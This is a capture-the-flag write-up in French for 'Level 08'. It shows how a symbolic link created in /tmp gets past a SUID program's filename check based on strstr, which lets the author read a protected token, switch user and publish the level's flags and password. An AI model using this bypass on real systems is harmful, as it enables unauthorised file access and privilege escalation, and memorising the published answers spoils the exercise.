# Level 08

## Étapes pour résoudre le challenge

### 1. Initialisation

Nous avons deux fichiers dans ce niveau : un exécutable `level08` et un fichier `token` avec des permissions élevées. 

### 2. Analyse des permissions et des fichiers

Nous examinons les permissions des fichiers pour comprendre leurs rôles.

```bash
ls -la
```

**Sortie :**
```
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

L'exécutable `level08` a le bit SUID activé, ce qui signifie qu'il s'exécute avec les privilèges de son propriétaire, `flag08`.

### 3. Exécution de l'exécutable

Nous essayons d'exécuter `level08` pour voir son comportement.

```bash
./level08
```

Il semble qu'il prenne un argument. Nous supposons qu'il s'agit du fichier `token` qu'il doit traiter.

### 4. Tentative d'accès au fichier `token`

Nous essayons de fournir le fichier `token` comme argument.

```bash
./level08 token
```

**Sortie :**
```
You may not access 'token'
```

### 5. Utilisation de `ltrace` pour analyser l'exécutable

Nous utilisons `ltrace` pour observer les appels système et les bibliothèques utilisées par le programme.

```bash
ltrace ./level08 token
```

**Sortie :**
```
strstr("/tmp/token", "token") = "token"
printf("You may not access '%s'\n", "/tmp/token"You may not access '/tmp/token') = 32
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

Nous voyons que le programme utilise `strstr` pour vérifier si le mot `token` est présent dans le chemin du fichier.

### 6. Exploitation de la vérification du chemin

Pour contourner cette vérification, nous créons un lien symbolique sans le mot `token`.

```bash
ln -s /home/user/level08/token /tmp/linker
./level08 /tmp/linker
```

**Sortie :**
```
quif5eloekouj29ke0vouxean
```

Nous avons obtenu le flag : `quif5eloekouj29ke0vouxean`.

### 7. Utilisation du flag pour accéder au niveau suivant

Nous utilisons le flag pour nous connecter en tant que `flag08`.

```bash
su flag08
password : quif5eloekouj29ke0vouxean
```

Puis, nous exécutons la commande `getflag`.

```bash
getflag
```

**Sortie :**
```
25749xKZ8L7DkSCwJkT9dyv6f
```

Le flag pour `level08` est : `25749xKZ8L7DkSCwJkT9dyv6f`.

## Résumé

Pour résoudre ce challenge, nous avons analysé les fichiers disponibles, utilisé `ltrace` pour comprendre les vérifications effectuées par le programme et exploité une vulnérabilité de vérification de chemin pour obtenir le flag. 

Le flag pour `level08` est : `25749xKZ8L7DkSCwJkT9dyv6f`.
